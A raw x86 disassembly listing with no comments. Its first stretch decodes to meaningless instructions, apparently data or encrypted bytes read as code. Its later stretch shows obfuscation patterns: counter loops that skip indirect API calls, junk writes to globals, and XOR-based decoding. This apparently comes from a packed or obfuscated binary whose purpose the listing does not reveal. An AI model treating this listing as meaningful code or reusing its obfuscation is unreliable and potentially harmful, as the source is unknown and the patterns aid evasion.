  41190c:	inc    ebx
  41190d:	xor    eax,0xe05960b0
  411912:	jg     0x411966
  411914:	jmp    0x4118bd
  411916:	mov    bh,0xc8
  411918:	je     0x411968
  41191a:	daa    
  41191b:	xchg   DWORD PTR [ecx+0x31a8df72],esp
  411921:	dec    ecx
  411922:	pop    eax
  411923:	iret   
  411924:	pop    ebx
  411925:	or     bl,BYTE PTR [ecx]
  411927:	fsubp  st(4),st
  411929:	scas   eax,DWORD PTR es:[edi]
  41192a:	outs   dx,BYTE PTR ds:[esi]
  41192b:	aad    0xf7
  41192d:	test   al,0x18
  41192f:	push   ebx
  411930:	outs   dx,DWORD PTR ds:[esi]
  411931:	mov    BYTE PTR [edx-0x4e],dl
  411934:	mov    WORD PTR [edi+0x65735a6e],?
  41193a:	mov    gs,edx
  41193c:	mov    bh,0xc6
  41193e:	push   edx
  41193f:	pop    ebp
  411940:	push   ss
  411941:	mov    esp,0x1678bba6
  411946:	or     cl,BYTE PTR [ebp+ebx*2-0x36]
  41194a:	aas    
  41194b:	mov    eax,0x4e924d8a
  411950:	jbe    0x4119a8
  411952:	add    BYTE PTR ds:0x43721086,cl
  411958:	push   0x5d
  41195a:	cdq    
  41195b:	fisub  WORD PTR [esi+0x5747a5e0]
  411961:	cmp    al,0x2c
  411963:	js     0x4118f5
  411965:	mov    al,0x4
  411967:	out    0x79,eax
  411969:	fnstcw WORD PTR [ebx-0x425c42d6]
  41196f:	cwde   
  411970:	retf   
  411971:	mov    ds:0x7979b021,al
  411976:	cs jp  0x411990
  411979:	adc    bh,dl
  41197b:	pushf  
  41197c:	jecxz  0x41199d
  41197e:	movd   mm1,DWORD PTR [eax+edi*8-0x22fc19ed]
  411986:	popa   
  411987:	xlat   BYTE PTR ds:[ebx]
  411988:	mov    al,0x2
  41198a:	push   eax
  41198b:	leave  
  41198c:	sub    ebp,DWORD PTR [ebx-0x194acc6e]
  411992:	fdivr  QWORD PTR [edi-0x6b294dc5]
  411998:	ret    
  411999:	xlat   BYTE PTR ds:[ebx]
  41199a:	mov    ah,0x72
  41199c:	in     eax,dx
  41199d:	sub    eax,0xa376a27d
  4119a2:	stos   DWORD PTR es:[edi],eax
  4119a3:	out    0x9b,al
  4119a5:	push   es
  4119a6:	mov    bh,0xa9
  4119a8:	imul   eax,ebp,0xfe3f4e83
  4119ae:	not    DWORD PTR [edi+0x6]
  4119b1:	sub    cl,BYTE PTR [ecx+0x61]
  4119b4:	lds    ebp,FWORD PTR ds:0x19681fb3
  4119ba:	in     al,dx
  4119bb:	xor    bl,BYTE PTR [edx+0x2295f456]
  4119c1:	add    dl,BYTE PTR [ebx]
  4119c3:	rcl    DWORD PTR [esi-0x7890c9cd],0x32
  4119ca:	mov    esi,DWORD PTR [ebp-0x45]
  4119cd:	pop    esp
  4119ce:	outs   dx,BYTE PTR ds:[esi]
  4119cf:	cld    
  4119d0:	mov    ch,0x73
  4119d2:	stc    
  4119d3:	add    BYTE PTR [eax-0x7dee4b8f],al
  4119d9:	into   
  4119da:	das    
  4119db:	icebp  
  4119dc:	pop    ss
  4119dd:	ja     0x411a1b
  4119df:	xor    BYTE PTR [esi],ch
  4119e1:	xor    ebp,edx
  4119e3:	cmp    al,BYTE PTR [eax-0x52]
  4119e6:	mov    ds:0x5380f523,eax
  4119eb:	leave  
  4119ec:	std    
  4119ed:	or     DWORD PTR [esp+edx*1],ebx
  4119f0:	jne    0x4119c1
  4119f2:	mov    bl,0x30
  4119f4:	inc    ebx
  4119f5:	hlt    
  4119f6:	enter  0x7841,0xa9
  4119fa:	cld    
  4119fb:	jno    0x411a50
  4119fd:	push   cs
  4119fe:	xor    eax,0x1511d549
  411a03:	out    dx,al
  411a04:	clc    
  411a05:	inc    eax
  411a06:	cmc    
  411a07:	div    BYTE PTR ds:0x649352e7
  411a0d:	xchg   ebx,eax
  411a0e:	pop    esi
  411a0f:	mov    cl,BYTE PTR [edx-0x23be096c]
  411a15:	enter  0x95c5,0x8d
  411a19:	push   ss
  411a1a:	mov    dh,0xc
  411a1c:	push   ss
  411a1d:	mov    DWORD PTR [ecx-0x1c],ebx
  411a20:	inc    esp
  411a21:	push   gs
  411a23:	inc    edi
  411a24:	add    dl,cl
  411a26:	jg     0x411a19
  411a28:	in     al,dx
  411a29:	test   BYTE PTR [ebx],bl
  411a2b:	sub    DWORD PTR [edi],esi
  411a2d:	test   al,0xa9
  411a2f:	je     0x4119f0
  411a31:	aam    0x8e
  411a33:	and    DWORD PTR [esi-0x1e],ecx
  411a36:	mov    dl,0x15
  411a38:	fcom   DWORD PTR [edx+0x613b5644]
  411a3e:	int    0xbc
  411a40:	push   ebp
  411a41:	imul   ebp,DWORD PTR cs:0x3d3bdbad,0x25
  411a49:	mov    edx,0xdbcbfe60
  411a4e:	lock js 0x411ab1
  411a51:	mov    bh,bl
  411a53:	inc    ecx
  411a54:	xchg   esp,eax
  411a55:	inc    edx
  411a56:	sub    BYTE PTR [ebx-0x3a155cee],cl
  411a5c:	data16 mov al,ds:0x8aa44e52
  411a62:	(bad)  
  411a63:	mov    WORD PTR [ecx],ss
  411a65:	xchg   esi,eax
  411a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a67:	and    ebp,DWORD PTR [ecx]
  411a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6a:	push   ecx
  411a6b:	cmp    DWORD PTR [edx+ebx*4-0x6d],ecx
  411a6f:	mov    ds,WORD PTR [ebx+0x4c]
  411a72:	pop    edi
  411a73:	jg     0x411a16
  411a75:	fimul  WORD PTR [eax]
  411a77:	fcmovne st,st(6)
  411a79:	je     0x411a78
  411a7b:	jb     0x411ac0
  411a7d:	out    dx,eax
  411a7e:	call   0x53b6f144
  411a83:	push   ds
  411a84:	mov    edi,0xf454456d
  411a89:	push   esp
  411a8a:	dec    edi
  411a8b:	aaa    
  411a8c:	jae    0x411a97
  411a8e:	aas    
  411a8f:	(bad)  
  411a90:	jge    0x411ae7
  411a92:	scas   eax,DWORD PTR es:[edi]
  411a93:	xchg   edx,eax
  411a94:	xchg   ecx,eax
  411a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a96:	loope  0x411a86
  411a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a99:	push   ds
  411a9a:	xchg   ebx,eax
  411a9b:	into   
  411a9c:	popa   
  411a9d:	(bad)  
  411a9e:	xchg   esp,eax
  411a9f:	daa    
  411aa0:	iret   
  411aa1:	or     al,0x8
  411aa3:	sahf   
  411aa4:	dec    ebp
  411aa5:	push   esp
  411aa6:	int3   
  411aa7:	out    dx,al
  411aa8:	dec    esi
  411aa9:	jae    0x411aa4
  411aab:	retf   
  411aac:	jp     0x411ab1
  411aae:	push   edx
  411aaf:	lock out dx,eax
  411ab1:	xor    dh,BYTE PTR [ebx]
  411ab3:	popa   
  411ab4:	jno    0x411adc
  411ab6:	mov    ebx,0x51ecfba8
  411abb:	imul   esi,DWORD PTR [esi],0x30721da4
  411ac1:	pushf  
  411ac2:	pop    edi
  411ac3:	add    al,0x68
  411ac5:	rol    DWORD PTR [ebp+0x59],1
  411ac8:	pop    ss
  411ac9:	dec    esi
  411aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411acb:	daa    
  411acc:	aad    0xb5
  411ace:	arpl   WORD PTR [edi+eax*1],sp
  411ad1:	jne    0x411af8
  411ad3:	retf   0x51a1
  411ad6:	loopne 0x411aac
  411ad8:	xchg   ebx,eax
  411ad9:	loopne 0x411a65
  411adb:	cs inc edx
  411add:	pop    ds
  411ade:	jae    0x411abf
  411ae0:	(bad)
  411ae3:	js     0x411a7e
  411ae5:	and    BYTE PTR [eax-0x64],ch
  411ae8:	mov    ebp,0x56c3ec93
  411aed:	xchg   ebx,eax
  411aee:	jns    0x411aaa
  411af0:	bound  ecx,QWORD PTR [eax+edx*2]
  411af3:	(bad)  
  411af4:	mov    bh,BYTE PTR [eax+0x454d9e3b]
  411afa:	xchg   DWORD PTR [esi],edx
  411afc:	cmp    edi,DWORD PTR [esi+edx*2+0x6a]
  411b00:	dec    esp
  411b01:	mov    bl,BYTE PTR [edx+0x2c57e213]
  411b07:	cld    
  411b08:	mov    bl,0xd8
  411b0a:	in     al,dx
  411b0b:	push   ebp
  411b0c:	sub    esi,edi
  411b0e:	cmc    
  411b0f:	sub    al,0x7a
  411b11:	je     0x411ad9
  411b13:	sbb    ebp,DWORD PTR [ecx-0x75]
  411b16:	cmc    
  411b17:	add    edi,esi
  411b19:	nop
  411b1a:	dec    ebp
  411b1b:	test   DWORD PTR [edx],eax
  411b1d:	mov    al,0x44
  411b1f:	mov    dl,0x94
  411b21:	cmp    DWORD PTR [edx+esi*4+0x58156e90],0x68
  411b29:	adc    esi,DWORD PTR [esi-0x25]
  411b2c:	mov    DWORD PTR [eax-0x7b],edx
  411b2f:	pop    bx
  411b31:	mov    cl,0x87
  411b33:	ror    ch,cl
  411b35:	jo     0x411ba7
  411b37:	inc    BYTE PTR [ebx]
  411b39:	int    0xe
  411b3b:	mov    dl,0xac
  411b3d:	mov    eax,ds:0xdfdba46e
  411b42:	into   
  411b43:	imul   ecx,DWORD PTR [ecx-0x47cc8195],0x16d8603d
  411b4d:	push   0x1d
  411b4f:	fwait
  411b50:	push   es
  411b51:	loop   0x411b0f
  411b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b54:	jmp    0xa2aa65cd
  411b59:	out    dx,eax
  411b5a:	push   ds
  411b5b:	(bad)  [esi+0x6efa3e6a]
  411b61:	add    DWORD PTR [esi+eax*2],edx
  411b64:	mov    al,ds:0x52d86993
  411b69:	pop    ds
  411b6a:	mov    esi,0x18e9b643
  411b6f:	call   0xaea9fed8
  411b74:	jecxz  0x411b63
  411b76:	xchg   ecx,eax
  411b77:	adc    al,0xd
  411b79:	int3   
  411b7a:	iret   
  411b7b:	leave  
  411b7c:	and    BYTE PTR [edi+0x7],bh
  411b7f:	add    BYTE PTR ss:[ecx+ecx*8],ch
  411b83:	mov    eax,0xa035e3fa
  411b88:	inc    edi
  411b89:	mov    ebp,0x7968c89
  411b8e:	fiadd  DWORD PTR [eax-0x1e]
  411b91:	sub    al,0xb4
  411b93:	and    eax,0x9b69f9d8
  411b98:	adc    ecx,DWORD PTR [esi-0x78794233]
  411b9e:	pop    ebx
  411b9f:	jg     0x411bb9
  411ba1:	inc    esp
  411ba2:	iret   
  411ba3:	retf   0xee49
  411ba6:	out    0xc5,al
  411ba8:	call   0x28a7:0x687be4c0
  411baf:	push   ebp
  411bb0:	inc    ebp
  411bb1:	mov    bh,BYTE PTR [ecx-0x6a]
  411bb4:	xchg   ebx,eax
  411bb5:	(bad)  
  411bb7:	repnz push eax
  411bb9:	mov    DWORD PTR [ebx-0x1c],esp
  411bbc:	mov    dh,0x25
  411bbe:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  411bc0:	mov    ebp,0x70cfb5bc
  411bc5:	imul   esp,DWORD PTR [eax],0x57
  411bc8:	leave  
  411bc9:	aam    0xea
  411bcb:	add    al,0xe4
  411bcd:	xchg   ecx,eax
  411bce:	pop    esi
  411bcf:	cld    
  411bd0:	xor    ch,dl
  411bd2:	fbstp  TBYTE PTR [eax]
  411bd4:	mov    bl,0xe0
  411bd6:	mov    bl,0x71
  411bd8:	inc    edi
  411bd9:	fwait
  411bda:	in     eax,0xc6
  411bdc:	xchg   esp,eax
  411bdd:	fidiv  DWORD PTR [esi-0x73]
  411be0:	cli    
  411be1:	mov    WORD PTR [ecx+0x51feb2e6],ds
  411be7:	inc    eax
  411be8:	fcom   QWORD PTR [eax+0x2e]
  411beb:	fmul   DWORD PTR [esi+0x65]
  411bee:	test   BYTE PTR [ebx+0x46891075],0x8
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
